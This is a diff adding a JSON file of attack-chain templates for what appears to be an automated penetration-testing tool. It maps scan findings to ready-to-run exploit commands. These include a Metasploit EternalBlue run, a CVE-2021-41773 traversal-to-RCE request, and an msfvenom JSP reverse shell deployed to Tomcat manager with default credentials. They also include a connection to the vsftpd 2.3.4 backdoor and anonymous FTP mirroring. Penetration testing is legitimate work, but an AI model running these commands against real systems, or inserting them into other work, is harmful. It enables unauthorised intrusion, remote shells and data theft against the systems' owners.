@@ -1,0 +1,59 @@
+{
+  "_comment": "Attack-chain templates. A chain matches when ALL of its 'when' conditions hold against the state (conditions absent are ignored): service_ports (any host has a service on one of these ports), os_contains (any host OS guess contains the string), product_contains (any service product contains it), finding_contains (any finding title contains it). Steps support {TARGET} {LHOST} {LPORT} placeholders.",
+  "chains": [
+    {
+      "id": "eternalblue",
+      "name": "MS17-010 EternalBlue (legacy Windows SMB)",
+      "priority": 0,
+      "when": {"service_ports": [445], "os_contains": "windows"},
+      "steps": [
+        "nmap -p445 --script smb-vuln-ms17-010 {TARGET}",
+        "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {TARGET}; set LHOST {LHOST}; run'"
+      ]
+    },
+    {
+      "id": "web-traversal",
+      "name": "Path traversal -> RCE",
+      "priority": 0,
+      "when": {"finding_contains": "traversal"},
+      "steps": [
+        "# confirm the traversal, then read /etc/passwd",
+        "# CVE-2021-41773/42013: POST /cgi-bin/.%2e/%2e%2e/bin/sh with a command body",
+        "breachload poc <cfg> --title traversal"
+      ]
+    },
+    {
+      "id": "tomcat-manager",
+      "name": "Tomcat manager WAR deploy",
+      "priority": 1,
+      "when": {"product_contains": "tomcat"},
+      "steps": [
+        "# browse /manager/html and /host-manager/html; try tomcat:tomcat, admin:admin",
+        "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war",
+        "curl -u tomcat:tomcat -T shell.war 'http://{TARGET}:8080/manager/text/deploy?path=/shell'"
+      ]
+    },
+    {
+      "id": "ftp-anon",
+      "name": "Anonymous FTP foothold",
+      "priority": 2,
+      "when": {"service_ports": [21]},
+      "steps": [
+        "ftp {TARGET}   # login anonymous / anonymous",
+        "# banner vsftpd 2.3.4 => CVE-2011-2523 backdoor: nc {TARGET} 6200",
+        "wget -m --no-passive ftp://anonymous:anonymous@{TARGET}/"
+      ]
+    },
+    {
+      "id": "smb-quickwins",
+      "name": "SMB enumeration quick wins",
+      "priority": 3,
+      "when": {"service_ports": [139, 445]},
+      "steps": [
+        "smbclient -N -L //{TARGET}/          # null-session share listing",
+        "smbmap -H {TARGET}                    # share permissions",
+        "enum4linux-ng -A {TARGET}"
+      ]
+    }
+  ]
+}
